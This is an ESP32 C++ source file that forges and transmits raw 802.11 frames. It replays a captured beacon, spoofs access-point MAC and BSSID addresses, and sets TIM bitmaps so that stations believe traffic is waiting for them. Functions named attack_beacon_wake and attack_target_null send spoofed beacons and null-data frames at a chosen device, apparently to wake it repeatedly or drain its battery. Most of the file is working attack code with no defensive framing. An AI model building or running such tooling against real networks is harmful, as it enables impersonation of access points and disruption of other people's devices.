#include <beacon_faker.h>

uint8_t broadcast_addr[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
uint8_t magic_addr[] = {0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb};

uint8_t beacon_raw_template[] = {
    /* maC header */
    0x80, 0x00,							                        // 0-1: Frame Control
    0x00, 0x00,							                        // 2-3: Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,				            // 4-9: Destination address (broadcast)
    0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb,				            // 10-15: Source address
    0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb,				            // 16-21: BSSID
    0x00, 0x00,							                        // 22-23: Sequence / fragment number

    /* beacon body */
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,			    // 24-31: Timestamp (GETS OVERWRITTEN TO 0 BY HARDWARE)
    0x64, 0x00,							                        // 32-33: Beacon interval
    0x31, 0x04,							                        // 34-35: Capability info
    0x00, 0x00, 				                                // 36-38: SSID parameter set, 0x00:length:content
    /* FILL CONTENT HERE */
    0x01, 0x08, 0x82, 0x84,	0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,	// 39-48: Supported rates
    0x03, 0x01, 0x01,						                    // 49-51: DS Parameter set, current channel 1 (= 0x01),
    0x05, 0x04, 0x01, 0x02, 0x00, 0xff,				            // 52-57: Traffic Indication Map, TIM
};

// 0xec, 0x17, 0x2f, 0xf3, 0x0b, 0x28,
// 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 

uint8_t sniffed_beacon[] = 
{
0x80, 0b00100000, /*frame ctrl*/ 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 
0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xa0, 0x46, 0xe1, 0x03, 0x7d, 0xbe, 0x0a, 0x00, 0x00, 0x00, 
0x64, 0x00, 0x31, 0x04, 0x00, 0x15, 0x54, 0x50, 0x2d, 0x4c, 0x49, 0x4e, 0x4b, 0x5f, 0x32, 0x2e, 
0x34, 0x47, 0x48, 0x7a, 0x5f, 0x46, 0x33, 0x30, 0x42, 0x32, 0x38, 0x01, 0x08, 0x82, 0x84, 0x8b, 
0x96, 0x0c, 0x12, 0x18, 0x24, 0x03, 0x01, 0x06, 0x05, 0x04, 0x00, 0x01, 0x01, /*<-make broadcast*/ 0xff, /*<-bit map*/ 0x2a, 0x01,
0x02, 0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 
0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00, 0x32, 0x04, 0x30, 0x48, 0x60, 0x6c, 0x2d, 0x1a, 0xef, 
0x11, 0x03, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0xe7, 0x0d, 0x00, 0x3d, 0x16, 0x06, 0x05, 0x15, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00, 0x00, 0x50, 0xf2, 0x04, 0x01, 0x00, 0x00, 
0x50, 0xf2, 0x04, 0x01, 0x00, 0x00, 0x50, 0xf2, 0x02, 0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 
0x01, 0x85, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 
0x32, 0x2f, 0x00, 0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f, 0xdd, 0x26, 
0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02, 0x10, 0x49, 
0x00, 0x14, 0x00, 0x24, 0xe2, 0x60, 0x02, 0x00, 0x01, 0x01, 0x60, 0x00, 0x00, 0x02, 0x00, 0x01, 
0x60, 0x01, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00                   
};

uint8_t beacon_buffer[MAX_BEACON_LEN];

void beacon_faker::setup(HardwareSerial* _Serial){
    mSerial = _Serial;
    nvs_flash_init();
    /**
     * Error checking using ESP_ERROR_CHECK macro.
     * Return type is esp_err_t
     */

    //stack configuration initialization, pass cfg to esp_wifi_init function.
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));  
    // esp_wifi_set_max_tx_power();
    wifi_config_t if_cfg;
    esp_wifi_get_config(WIFI_IF_AP, &if_cfg);
    memcpy(if_cfg.ap.ssid, AP_BASE_SSID, strlen(AP_BASE_SSID));
    if_cfg.ap.ssid_len = strlen(AP_BASE_SSID);
    esp_wifi_set_config(WIFI_IF_AP, &if_cfg);
    ESP_ERROR_CHECK(esp_wifi_start());
};

void beacon_faker::set_faker_srcAddr(uint8_t mac[6]){
    /*
        will not modify the if mac address.
    */
    for (size_t i = 0; i < 6; i++)
    {
        _src_address[i] = mac[i];
    }
    // esp_wifi_set_mac(WIFI_IF_AP, _src_address);
}

void beacon_faker::send_basic_beacon(){
    uint8_t beacon_buffer[2048];
    memcpy(&beacon_buffer, sniffed_beacon, sizeof(sniffed_beacon)); 
    memcpy(&beacon_buffer[SRCADDR_OFFSET], _src_address, sizeof(_src_address));
    memcpy(&beacon_buffer[SRCADDR_OFFSET+6], _src_address, sizeof(broadcast_addr));
    beacon_buffer[SEQNUM_OFFSET] = (seqn& 0x0f) << 4;
    beacon_buffer[SEQNUM_OFFSET + 1] = (seqn & 0xff0) >> 4;
    seqn++;
    if (seqn > 0xfff) seqn = 0;
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, sizeof(sniffed_beacon), false));
}

uint8_t beacon_fake_bssid[6] = {0xec, 0x17, 0x2f, 0xf3, 0x0b, 0x29};

/*
    This function will use the template to make
*/
void beacon_faker::send_imitate_beacon(uint8_t source_addr[6], uint8_t *TIM_bit_map, int map_len){

    memcpy(beacon_buffer, beacon_raw_template, sizeof(beacon_raw_template));
    
    struct mac_header_template m_header;
    struct beacon_TIM_template m_TIM;
    
    memcpy(&m_header.scr_addr, &source_addr, sizeof(uint8_t)*6);
    memcpy(&m_header.BSSID, beacon_fake_bssid, sizeof(uint8_t)*6);
    memcpy(beacon_buffer, &m_header, sizeof(m_header));
    
    // map_len >= 1
    m_TIM.length = map_len + 4;
    for (size_t i = 0; i < map_len; i++){
        m_TIM.bitmap[i] = TIM_bit_map?TIM_bit_map[i]:0xff;
    }

    memcpy(beacon_buffer+TIM_OFFSET, &m_TIM, 5 + map_len);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, TIM_OFFSET + 5 + map_len, false));
}

void beacon_faker::attack_beacon_wake(uint8_t source_addr[6]){
    send_imitate_beacon(source_addr, nullptr, 4);
}

void beacon_faker::attack_beacon_wake_modi_new(){
    // this function will only broadcast
    int ssid_len = strlen(ATK_SSID_FAKE);
    uint8_t beacon_buffer[200];
    memcpy(beacon_buffer, beacon_raw_template, BEACON_SSID_OFFSET - 1);
    beacon_buffer[BEACON_SSID_OFFSET - 1] = ssid_len;
    memcpy(&beacon_buffer[SRCADDR_OFFSET], _src_address, sizeof(broadcast_addr));
    memcpy(&beacon_buffer[BEACON_SSID_OFFSET], ATK_SSID_FAKE, ssid_len);
    memcpy(&beacon_buffer[BEACON_SSID_OFFSET + ssid_len], &beacon_raw_template[BEACON_SSID_OFFSET], 
    sizeof(beacon_raw_template) - BEACON_SSID_OFFSET);

    // Update sequence number
    beacon_buffer[SEQNUM_OFFSET] = (seqn& 0x0f) << 4;
    beacon_buffer[SEQNUM_OFFSET + 1] = (seqn & 0xff0) >> 4;
    seqn++;
    if (seqn > 0xfff)
        seqn = 0;
    esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, sizeof(beacon_raw_template) + ssid_len, false);
}

void beacon_faker::send_ssid_beacon(const char *ssid_info, uint16_t& seqnum){
    int ssid_len = strlen(ssid_info);
    uint8_t beacon_buffer[256];
    memcpy(beacon_buffer, beacon_raw_template, BEACON_SSID_OFFSET - 1);
    beacon_buffer[BEACON_SSID_OFFSET - 1] = ssid_len;
    memcpy(&beacon_buffer[BEACON_SSID_OFFSET], ssid_info, ssid_len);
    memcpy(&beacon_buffer[BEACON_SSID_OFFSET + ssid_len], &beacon_raw_template[BEACON_SSID_OFFSET], 
    sizeof(beacon_raw_template) - BEACON_SSID_OFFSET);

    // Update sequence number
    beacon_buffer[SEQNUM_OFFSET] = (seqnum& 0x0f) << 4;
    beacon_buffer[SEQNUM_OFFSET + 1] = (seqnum & 0xff0) >> 4;
    seqnum++;
    if (seqnum > 0xfff)
        seqnum = 0;
    esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, sizeof(beacon_raw_template) + ssid_len, false);
}


#define FRAME_CTRL_NULL_DATA 0x48

const char * faker_fails[] = 
    {
        "ESP_OK: success",
        "ESP_ERR_WIFI_IF: Invalid interface",
        "ESP_ERR_INVALID_ARG: Invalid parameter",
        "ESP_ERR_WIFI_NO_MEM: out of memory"    
    };

void beacon_faker::attack_target_null(uint8_t mmac[6]){
    struct mac_header_template header;

    header.Frame_Ctrl[0] = 0x48;
    memcpy(header.dest_addr, mmac, 6);
    memcpy(header.scr_addr, _src_address, 6);
    memcpy(header.BSSID, _src_address, 6);

    memcpy(beacon_buffer, &header, sizeof(header));
    
    // 空数据包只有null
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, sizeof(header), false);
    // switch (err)
    // {
    // case ESP_OK:
    //     mSerial->println(faker_fails[0]);
    //     break;
    // case ESP_ERR_WIFI_IF:
    //     mSerial->println(faker_fails[1]);
    //     break;
    // case ESP_ERR_INVALID_ARG:
    //     mSerial->println(faker_fails[2]);
    //     break;
    // default:
    //     mSerial->println("unknown");
    //     break;
    // }

}